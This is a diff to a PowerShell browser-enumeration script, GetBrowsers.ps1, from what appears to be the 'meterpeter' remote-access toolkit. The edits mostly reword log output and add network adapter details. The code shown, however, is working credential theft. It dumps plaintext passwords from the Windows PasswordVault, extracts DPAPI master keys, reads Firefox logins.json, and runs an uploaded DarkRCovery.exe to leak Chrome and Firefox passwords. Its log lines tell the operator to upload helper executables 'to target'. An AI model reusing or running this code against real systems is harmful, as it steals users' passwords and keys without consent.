@@ -145,6 +145,8 @@ If($IntSet){$ParsingIntSet = $IntSet -replace '@{User Agent=','UserAgent    : ' 
 ## Get Default Gateway IpAddress (IPV4)
 $RGateway = (Get-NetIPConfiguration|Foreach IPv4DefaultGateway -ErrorAction SilentlyContinue).NextHop
 If(-not($RGateway) -or $RGateway -eq $null){$RGateway = "{null}"}
+$nwINFO = Get-WmiObject -ComputerName (hostname) Win32_NetworkAdapterConfiguration|Where-Object { $_.IPAddress -ne $null }
+$DHCPName = $nwINFO.DHCPEnabled;$ServiceName = $nwINFO.ServiceName
 
 ## Internet statistics
 $recstats = netstat -s -p IP|select-string -pattern "Packets Received"
@@ -155,7 +157,9 @@ If($delstats){$deliverdata = $delstats -replace '  Received Packets Delivered   
 ## Writting LogFile to the selected path in: { $param2 var }
 echo "`n`nSystem Defaults" > $LogFilePath\BrowserEnum.log
 echo "---------------" >> $LogFilePath\BrowserEnum.log
+echo "DHCPEnabled  : $DHCPName" >> $LogFilePath\BrowserEnum.log
 echo "Interface    : $DefaultInterface" >> $LogFilePath\BrowserEnum.log
+echo "ServiceName  : $ServiceName" >> $LogFilePath\BrowserEnum.log
 echo "$RHserver" >> $LogFilePath\BrowserEnum.log
 echo "$ParseCap" >> $LogFilePath\BrowserEnum.log 
 echo "$ParsingIntSet" >> $LogFilePath\BrowserEnum.log
@@ -573,9 +577,9 @@ function FIREFOX {
         }
     
         If(-not(Test-Path "$env:tmp\mozlz4-win32.exe")){
-            echo "{Upload: meterpeter\mimiRatz\mozlz4-win32.exe to target `$env:tmp}" >> $LogFilePath\BrowserEnum.log
-            echo "{And Execute: [ ./GetBrowsers.ps1 -FIREFOX ] again for clean outputs}" >> $LogFilePath\BrowserEnum.log
-            echo "{https://github.com/r00t-3xp10it/meterpeter/blob/master/mimiRatz/mozlz4-win32.exe}" >> $LogFilePath\BrowserEnum.log
+            echo "Upload: meterpeter\mimiRatz\mozlz4-win32.exe to target `$env:tmp" >> $LogFilePath\BrowserEnum.log
+            echo "Execute: [ ./GetBrowsers.ps1 -FIREFOX ] again for clean outputs" >> $LogFilePath\BrowserEnum.log
+            echo "URL: https://github.com/r00t-3xp10it/meterpeter/blob/master/mimiRatz/mozlz4-win32.exe" >> $LogFilePath\BrowserEnum.log
             ## mozlz4-win32.exe Firefox Fail dependencie bypass
             # I cant use 'ConvertFrom-Json' cmdlet because it gives
             # 'primitive JSON invalid error' parsing .jsonlz4 files to TEXT|CSV ..  
@@ -774,7 +778,7 @@ function CHROME {
 
 function ADDONS {  
     ## Retrieve IE addons
-    echo "`n`n[ IE ]" >> $LogFilePath\BrowserEnum.log
+    echo "`n`n[ IE|MSEDGE ]" >> $LogFilePath\BrowserEnum.log
     echo "`nName" >> $LogFilePath\BrowserEnum.log
     echo "----" >> $LogFilePath\BrowserEnum.log
     If(-not(Test-Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Ext\Settings")){
@@ -815,7 +819,6 @@ function ADDONS {
 
     ## Retrieve Chrome addons
     echo "`n`n[ Chrome ]" >> $LogFilePath\BrowserEnum.log
-    echo "----------" >> $LogFilePath\BrowserEnum.log
     If(-not(Test-Path "\\$env:COMPUTERNAME\c$\users\*\appdata\local\Google\Chrome\User Data\Default\Extensions\*\*\manifest.json" -ErrorAction SilentlyContinue)){
         echo "{None addons found}" >> $LogFilePath\BrowserEnum.log
     }else{
@@ -828,17 +831,18 @@ function ADDONS {
 function CREDS_DUMP {
     ## Retrieve IE Credentials
     echo "`n`n[ IE|MSEDGE ]" >> $LogFilePath\BrowserEnum.log
+
     ## Retrieve Credentials from PasswordVault
     # https://github.com/HanseSecure/credgrap_ie_edge/blob/master/credgrap_ie_edge.ps1
     [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
     $vault = New-Object Windows.Security.Credentials.PasswordVault
-    $DumpVault = $vault.RetrieveAll()| % { $_.RetrievePassword();$_ }|select Resource, UserName, Password|Sort-Object Resource|ft -AutoSize
+    $DumpVault = $vault.RetrieveAll()| % { $_.RetrievePassword();$_ }|Select Resource, UserName, Password|Sort-Object Resource|ft -AutoSize
  
     If(-not($DumpVault) -or $DumpVault -eq $null){
         echo "------------------------------------------------" >> $LogFilePath\BrowserEnum.log
         echo "None Credentials found => extracting master keys" >> $LogFilePath\BrowserEnum.log
-        ## None credentials found in Vault, trying to extract master keys
 
+        ## None credentials found in Vault, trying to extract master keys
         If(Test-Path -Path "$env:AppData\Microsoft\Protect\"){
             $SIDPath = "$env:AppData\Microsoft\Protect\"
             $StoreSID = dir "$SIDPath"|Select-Object -ExpandProperty Name -ErrorAction SilentlyContinue
@@ -849,11 +853,12 @@ function CREDS_DUMP {
             $RegexSearch = $SplitString|Select-String -pattern '[a-zA-Z]'
             $RawMasterKeys = $RegexSearch -replace ' ',''
 
-            ## Build table to display results
+            ## Build table to display master keys leaked
             echo "`nMaster keys" >> $LogFilePath\BrowserEnum.log
             echo "-----------" >> $LogFilePath\BrowserEnum.log
             If(-not($RawMasterKeys) -or $RawMasterKeys -eq $null){
-                echo "None master keys found" >> $LogFilePath\BrowserEnum.log
+                $UserSID = $StoreSID.Substring(0,8)
+                echo "None master keys found in => [$UserSID]" >> $LogFilePath\BrowserEnum.log
             }else{
                 echo $RawMasterKeys >> $LogFilePath\BrowserEnum.log
             }
@@ -871,7 +876,7 @@ function CREDS_DUMP {
     If(-not(Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\logins.json")){
         $Bookmarks_Path = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\logins.json" # (IEFP)
         If(-not(Test-Path "$Bookmarks_Path")){
-            echo "None Credentials found" >> $LogFilePath\BrowserEnum.log
+            echo "None Encrypted Credentials found" >> $LogFilePath\BrowserEnum.log
         }else{
             echo "Extracting => encrypted creds" >> $LogFilePath\BrowserEnum.log
             $Bookmarks_Path = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\logins.json" # (IEFP)
@@ -889,8 +894,8 @@ function CREDS_DUMP {
 
     ## Leak Firefox|Chrome credentials to plain text { EXE Coded By 0xyg3n }
     # DarkRCovery requires to be uploaded to $env:TMP { Client working dir }
-    echo "`n`n[ Leak credentials (plain text) => By 0xyg3n ]" >> $LogFilePath\BrowserEnum.log
-    echo "----------------------------------------------" >> $LogFilePath\BrowserEnum.log
+    echo "`n`n[ Leak credentials => By 0xyg3n ]" >> $LogFilePath\BrowserEnum.log
+    echo "---------------------------------" >> $LogFilePath\BrowserEnum.log
     If(Test-Path "$env:TMP\DarkRCovery.exe"){
     cd $env:TMP;Start-Process "$env:TMP\DarkRCovery.exe" -Wait # Wait for DarkRCovery.exe to finish ..
         If(Test-Path "$env:TMP\Leaked.txt"){
@@ -914,9 +919,9 @@ function CREDS_DUMP {
             cd $IPATH
         }
     }else{
-        echo "Upload: meterpeter\mimiRatz\DarkRCovery.exe to target `$env:TMP" >> $LogFilePath\BrowserEnum.log
-        echo "And Execute: [ ./GetBrowsers.ps1 -CREDS ] to leak firefox|chrome credentials" >> $LogFilePath\BrowserEnum.log
-        echo "https://github.com/r00t-3xp10it/meterpeter/blob/master/mimiRatz/DarkRCovery.exe" >> $LogFilePath\BrowserEnum.log
+        echo "Upload: meterpeter\mimiRatz\DarkRCovery.exe to target `$env:TMP directory" >> $LogFilePath\BrowserEnum.log
+        echo "Execute: [ ./GetBrowsers.ps1 -CREDS ] to leak firefox|chrome credentials (plain text)" >> $LogFilePath\BrowserEnum.log
+        echo "URL: https://github.com/r00t-3xp10it/meterpeter/blob/master/mimiRatz/DarkRCovery.exe" >> $LogFilePath\BrowserEnum.log
     }
     
     ## Search for passwords in { ConsoleHost_history }
